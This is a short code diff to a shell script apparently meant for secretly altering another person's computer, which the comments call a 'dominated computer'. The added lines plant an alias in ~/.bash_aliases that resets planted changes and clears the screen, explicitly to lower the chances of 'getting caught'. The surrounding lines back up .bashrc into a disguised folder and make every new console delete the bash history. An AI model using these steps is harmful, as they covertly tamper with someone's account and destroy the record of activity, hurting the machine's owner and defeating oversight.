@@ -9,6 +9,10 @@ Backups="Dokumenty"
 rm -f ~/$Backups/.bashrc
 cp -b  ~/.bashrc ~/$Backups/.bashrc
 
+# Safety Alias Used To Reset Counter (use every time you are using dominated computer to lower chances of getting caught)
+# Console Is Cleared After Reset
+echo "alias domination-reset=\"rm -f ~/.bash_aliases & cp -b ~/$Backups/.bash_aliases ~/.bash_aliases & clear \"" >> ~/.bash_aliases
+
 # Clear Bash History On Every Console Start
 echo 'rm -f ~/.bash_history' >> ~/.bash_aliases
 
